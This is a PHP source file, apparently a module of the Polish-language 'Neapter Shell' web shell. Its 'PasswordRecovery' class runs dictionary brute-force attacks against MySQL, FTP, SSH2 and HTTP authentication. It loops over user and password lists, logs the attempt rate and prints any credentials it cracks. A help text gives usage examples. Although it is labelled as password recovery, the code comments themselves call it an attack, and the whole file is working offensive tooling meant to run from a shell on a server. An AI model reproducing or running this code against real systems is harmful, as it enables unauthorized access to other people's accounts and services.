<?php

/**
 * Neapter Shell
 *
 * @author    Krzysztof Otręba <krzotr@gmail.com>
 * @copyright Copyright (c) 2011, Krzysztof Otręba
 *
 * @license   http://www.gnu.org/licenses/gpl-3.0.txt
 */

/**
 * PasswordRecoveryException - Odzyskiwanie hasel wyjatki
 */
class PasswordRecoveryException extends Exception {}

/**
 * class PasswordRecovery - Odzyskiwanie hasel
 *
 * Dostepne protokoly to MySQL, SSH2, FTP oraz HTTP
 */
class PasswordRecovery
{
	/**
	 * Adres hosta
	 *
	 * @access protected
	 * @var    string
	 */
	protected $sHost;

	/**
	 * Port
	 *
	 * @access protected
	 * @var    integer
	 */
	protected $iPort = 0;

	/**
	 * Typ mysql, ssh2, ftp, http
	 *
	 * @access protected
	 * @var    string
	 */
	protected $sType;

	/**
	 * Lista uzytkownikow
	 *
	 * @access protected
	 * @var    array
	 */
	protected $aUsers = array();

	/**
	 * Lista hasel
	 *
	 * @access protected
	 * @var    array
	 */
	protected $aPasswords = array();

	/**
	 * Czy PDO jest dostepne
	 *
	 * @access protected
	 * @var    boolean
	 */
	protected $bPdo    = FALSE;

	/**
	 * Czy MYSQLi jest dostepne
	 *
	 * @access protected
	 * @var    boolean
	 */
	protected $bMysqli = FALSE;

	/**
	 * Czy CURL jest dostepny
	 *
	 * @access protected
	 * @var    boolean
	 */
	protected $bCurl   = FALSE;

	/**
	 * Czy FTP jest dostepne
	 *
	 * @access protected
	 * @var    boolean
	 */
	protected $bFtp    = FALSE;

	/**
	 * Zasob CURL, dla typu http, Keep-Alive
	 *
	 * @access protected
	 * @var    resource
	 */
	protected $rCurl;

	/**
	 * Konstruktor
	 *
	 * @access public
	 * @return void
	 */
	public function __construct()
	{
		/**
		 * Dostepnosc rozszerzen / funkcji
		 */
		$this -> bCurl       = extension_loaded( 'curl' );
		$this -> bFsockopen  = function_exists( 'fsockopen' );
		$this -> bPfsockopen = function_exists( 'pfsockopen' );
		$this -> bMysqli     = extension_loaded( 'mysqli' );
		$this -> bPdo        = ( extension_loaded( 'pdo' ) && extension_loaded( 'pdo_mysql' ) );
		$this -> bFtp        = function_exists( 'ftp_connect' );
	}

	/**
	 * Ustawianie host'a
	 *
	 * @access public
	 * @param  string            $sValue Host
	 * @return PasswordRecovery          Obiekt PasswordRecovery
	 */
	public function setHost( $sValue )
	{
		@ list( $sHost, $iPort ) = explode( ':', $sValue );

		if( ctype_digit( $iPort ) )
		{
			$this -> sHost = $sHost;
			$this -> iPort = $iPort;
		}
		else
		{
			$this -> sHost = $sValue;
		}

		return $this;
	}

	/**
	 * Ustawianie typu ataku
	 *
	 * @access public
	 * @param  string           $sValue
	 * @return PasswordRecovery         Obiekt PasswordRecovery
	 */
	public function setType( $sValue )
	{
		$sValue = strtolower( $sValue );

		if( ! in_array( $sValue, array( 'ssh2', 'ftp', 'mysql', 'http' ) ) )
		{
			throw new PasswordRecoveryException( 'Błędny typ ataku' );
		}

		if( ( $sValue === 'ssh2' ) && ! extension_loaded( 'ssh2' ) )
		{
			throw new PasswordRecoveryException( 'Rozszerzenie SSH2 jest wymagane' );
		}
		else if( $sValue === 'mysql' )
		{
			if( ! $this -> bMysqli && ! $this -> bPdo && ! extension_loaded( 'mysqli' ) )
			{
				throw new PasswordRecoveryException( 'Żadne z rozszerzeń mysql, mysql, pdo_mysql nie jest dostepne' );
			}
		}
		else if( ( $sValue === 'ftp' ) )
		{
			if( ! extension_loaded( 'ftp' ) && ! $this -> bCurl )
			{
				throw new PasswordRecoveryException( 'Rozszerzenie FTP nie jest dostępne' );
			}
		}
		else if( ( $sValue === 'http' ) && ! $this -> bCurl )
		{
			throw new PasswordRecoveryException( 'Rozszerzenie CURL nie jest dostępne' );
		}

		$this -> sType = $sValue;

		return $this;
	}

	/**
	 * Ustawianie uzytkownikow
	 *
	 * @access public
	 * @param  string|array     $mValue Nazwa uzytkownika, tablica z uzytkownikami lub sciezka do pliku
	 * @return PasswordRecovery         Obiekt PasswordRecovery
	 */
	public function setUsers( $mValue )
	{
		if( is_file( $mValue ) )
		{
			$this -> aUsers = array_filter( file( $mValue, FILE_SKIP_EMPTY_LINES | FILE_IGNORE_NEW_LINES ) );
		}
		else
		{
			$this -> aUsers = (array) $mValue;
		}

		return $this;
	}


	/**
	 * Ustawianie hasel
	 *
	 * @access public
	 * @param  string           $sValue Sciezka do pliku z haslami
	 * @return PasswordRecovery         Obiekt PasswordRecovery
	 */
	public function setPasswords( $sValue )
	{
		if( ! is_file( $sValue ) )
		{
			throw new PasswordRecoveryException( 'Nie można odczytać pliku z hasłami' );
		}

		$this -> aPasswords = array_filter( file( $sValue, FILE_SKIP_EMPTY_LINES | FILE_IGNORE_NEW_LINES ) );

		return $this;
	}

	/**
	 * Wykonanie ataku
	 *
	 * @access public
	 * @return void
	 */
	public function get()
	{
		/**
		 * Typ ataku jest wymagany
		 */
		if( $this -> sType === NULL )
		{
			throw new PasswordRecoveryException( 'Nie wybrano typu ataku' );
		}

		/**
		 * Host jest wymagany
		 */
		if( $this -> sHost === NULL )
		{
			throw new PasswordRecoveryException( 'Nie wprowadzono hosta' );
		}

		/**
		 * Lista uzytkownikow jest wymagana
		 */
		if( $this -> aUsers === array() )
		{
			throw new PasswordRecoveryException( 'Nie podano użytkowników' );
		}

		/**
		 * Lista z haslami jest wymagana
		 */
		if( $this -> aPasswords === array() )
		{
			throw new PasswordRecoveryException( 'Nie podano pliku z hasłami' );
		}

		/**
		 * Ilosc wszystkich hasel
		 */
		$iTotalPasswords = count( $this -> aPasswords );

		$fTime = microtime( 1 );
		$fTotalTime = microtime( 1 );

		$iS = 4;

		printf( "Odzyskanie hasła %s - %s:%d\r\n\r\n", $this -> sType, $this -> sHost, $this -> iPort );

		foreach( $this -> aUsers as $iKey => $sUser )
		{
			$i = 1;
			foreach( $this -> aPasswords as $iPasswordKey => $sPassword )
			{
				if( ( $i % $iS === 0 ) )
				{
					$fSpeed = $iS / ( ( microtime( 1 ) - $fTime ) );

					/**
					 * Wyliczanie tak, by statystyki ukazywaly sie mniej wiecej co sekunde
					 */
					if( $fSpeed < 3 )
					{
						$iS = 1;
					}
					else if( $fSpeed < 5 )
					{
						$iS = 5;
					}
					else if( $fSpeed < 10 )
					{
						$iS = 10;
					}
					else if( $fSpeed < 20 )
					{
						$iS = 20;
					}
					else if( $fSpeed < 50 )
					{
						$iS = 50;
					}
					else if( $fSpeed < 100 )
					{
						$iS = 100;
					}
					else if( $fSpeed < 200 )
					{
						$iS = 200;
					}
					else if( $fSpeed < 300 )
					{
						$iS = 300;
					}
					else if( $fSpeed < 500 )
					{
						$iS = 500;
					}

					/**
					 * Statystyki
					 */
					printf( "U: %s, pos: %06d/%06d, prog: %6.2f%%, speed: %5.1f p/s, ETA: %6.1f s, cpasswd: %s\r\n",
						$sUser,
						$iPasswordKey + 1,
						$iTotalPasswords,
						$iPasswordKey / $iTotalPasswords * 100,
						$fSpeed,
						( $iTotalPasswords - $iPasswordKey + 1 ) / $fSpeed,
						$sPassword
					);
					$fTime = microtime( 1 );

					@ ob_flush();
					@ flush();
				}
				$i++;

				/**
				 * Sprawdzanie danych do autoryzacji
				 */
				if( $this -> login( $sUser, $sPassword ) )
				{
					printf( "\r\nOdzyskano hasło: %s - %s:%d\r\n%s:%s\r\n\r\n", $this -> sType, $this -> sHost, $this -> iPort, $sUser, $sPassword );

					@ ob_flush();
					@ flush();

					break ;
				}
			}
		}

		/**
		 * Koncowe statystyki
		 */
		printf( "\r\nŚrednia prędkość: %.1f p/s, cały proces zajął: %6.2f s", $i / ( ( microtime( 1 ) - $fTotalTime ) ), microtime( 1 ) - $fTotalTime );
	}

	/**
	 * Wykonanie logowania na poszczegolne protokoly
	 *
	 * @access protected
	 * @param  string    $sUsername Uzytkownik
	 * @param  string    $sPassword Haslo
	 * @return boolean              <b>TRUE</b> - jezeli udalo sie zalogowac
	 */
	protected function login( $sUsername, $sPassword )
	{
		switch( $this -> sType )
		{
			/**
			 * Mysql - dostepne rozszerzenie MYSQLi, PDO, MYSQL
			 */
			case 'mysql':
				/**
				 * Rozszerzenie MYSQLi
				 * Predkosc: 59 p/s
				 */
				if( $this -> bMysqli )
				{
					return @ mysqli_connect( $this -> sHost, $sUsername, $sPassword, '', $this -> iPort );
				}

				/**
				 * Rozszerzenie PDO
				 * Predkosc: 59 p/s
				 */
				if( $this -> bPdo )
				{
					try
					{
						$oPdo = new PDO( sprintf( 'mysql:host=%s;port=%d', $this -> sHost, $this -> iPort ), $sUsername, $sPassword );
						return TRUE;
					}
					catch( PDOException $oException )
					{
						return FALSE;
					}
				}

				/**
				 * Rozszerzenie MYSQL
				 * Predkosc: 58 p/s
				 */
				return @ mysql_connect( $this -> sHost . ':' . $this -> iPort, $sUsername, $sPassword );
			/**
			 * FTP - dostepne rozszerzenia FTP, CURL
			 */
			case 'ftp':
				if( $this -> bFtp )
				{
					/**
					 * Rozszerzenie FTP
					 * Predkosc: 35 p/s
					 */
					if( ! ( $rFtp = ftp_connect( $this -> sHost, $this -> iPort, 10 ) ) )
					{
						return FALSE;
					}

					return @ ftp_login( $rFtp, $sUsername, $sPassword );
				}

				/**
				 * Rozszerzenie CURL
				 * Predkosc: 35 p/s
				 */
				if( ( $rCurl = @ curl_init( sprintf( 'ftp://%s:%s@%s:%d/', $sUsername, $sPassword, $this -> sHost, $this -> iPort ) ) ) )
				{
					curl_setopt_array( $rCurl, array
						(
							$rCurl, CURLOPT_TIMEOUT        => 10,
							$rCurl, CURLOPT_RETURNTRANSFER => 1
						)
					);

					return @ curl_exec( $rCurl );
				}

				return FALSE;
			/**
			 * HTTP - dostepne rozszerzenie CURL
			 */
			case 'http':
				/**
				 * Rozszerzenie CURL
				 * Predkosc: 85 p/s
				 */
				if( $this -> rCurl === NULL )
				{
					$this -> rCurl = curl_init();
				}

				curl_setopt_array( $this -> rCurl, array
					(
						CURLOPT_URL            => $this -> sHost,
						CURLOPT_USERAGENT      => 'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; pl) Opera 11.11 (pl,pl-PL;q=0.9,en;q=0.8)',
						CURLOPT_HTTPAUTH       => CURLAUTH_ANY,
						CURLOPT_USERPWD        => sprintf( '%s:%s', $sUsername, $sPassword ),
						CURLOPT_HEADER         => 1,
						CURLOPT_TIMEOUT        => 10,
						CURLOPT_RETURNTRANSFER => 1,
						CURLOPT_FRESH_CONNECT  => 0,
						CURLOPT_FORBID_REUSE   => 0
					)
				);
				return ( @ strpos( @ curl_exec( $this -> rCurl ), ' 200 OK' ) !== FALSE );
			/**
			 * SSH2 - dostepne rozszerzenie SSH2
			 */
			case 'ssh2':
				if( ! ( $rSsh2 = @ ssh2_connect( $this -> sHost, $this -> iPort ) ) )
				{
					return FALSE;
				}

				return @ ssh2_auth_password( $rSsh2, $sUsername, $sPassword );
		}
	}

}

/**
 * =================================================================================================
 */

/**
 * ModulePasswordRecovery - Odzyskiwanie hasel
 */
class ModulePasswordRecovery implements ShellInterface
{
	/**
	 * Obiekt Shell
	 *
	 * @access private
	 * @var    object
	 */
	private $oShell;

	/**
	 * Konstruktor
	 *
	 * @access public
	 * @param  object $oShell Obiekt Shell
	 * @return void
	 */
	public function __construct( Shell $oShell )
	{
		$this -> oShell = $oShell;
	}

	/**
	 * Dostepna lista komend
	 *
	 * @access public
	 * @return array
	 */
	public function getCommands()
	{
		return array
		(
			'passwordrecovery',
			'pr'
		);
	}

	/**
	 * Zwracanie wersji modulu
	 *
	 * @access public
	 * @return string
	 */
	public function getVersion()
	{
		/**
		 * Wersja Data Autor
		 */
		return '1.0 2011-06-04 - <krzotr@gmail.com>';
	}

	/**
	 * Zwracanie pomocy modulu
	 *
	 * @access public
	 * @return string
	 */
	public function getHelp()
	{
		return <<<DATA
Odzyskiwanie haseł, atak słownikowy na mysql, ftp, ssh2 oraz http

	Typ:
		mysql
		ftp
		ssh2
		http

	Użycie:
		passwordrecovery typ host:port uzytkownik|plik_z_uzytkownikami slownik
		passwordrecovery typ http://localhost/auth/ uzytkownik|plik_z_uzytkownikami slownik

	Przykład:
		passwordrecovery http http://localhost/auth/ tester /tmp/dic
		passwordrecovery mysql localhost:3306 tester /tmp/dic
DATA;
	}

	/**
	 * Wywolanie modulu
	 *
	 * @access public
	 * @return string
	 */
	public function get()
	{
		/**
		 * Czy modul jest zaladowany
		 */
		if( ! class_exists( 'PasswordRecovery' ) )
		{
			return 'passwordrecovery, pr - !!! moduł nie został załadowany';
		}

		/**
		 * Help
		 */
		if( $this -> oShell -> iArgc !== 4 )
		{
			return $this -> getVersion();
		}

		try
		{
			ob_start();

			header( 'Content-Type: text/plain; charset=utf-8', TRUE );

			$oPasswordRecovery = new PasswordRecovery();
			$oPasswordRecovery -> setHost( $this -> oShell -> aArgv[1] )
					   -> setType( $this -> oShell -> aArgv[0] )
					   -> setUsers( $this -> oShell -> aArgv[2] )
					   -> setPasswords( $this -> oShell -> aArgv[3] )
					   -> get();
			ob_end_flush();
			exit ;

		}
		catch( PasswordRecoveryException $oException )
		{
			header( 'Content-Type: text/html; charset=utf-8', TRUE );
			return $oException -> getMessage();
		}
	}

}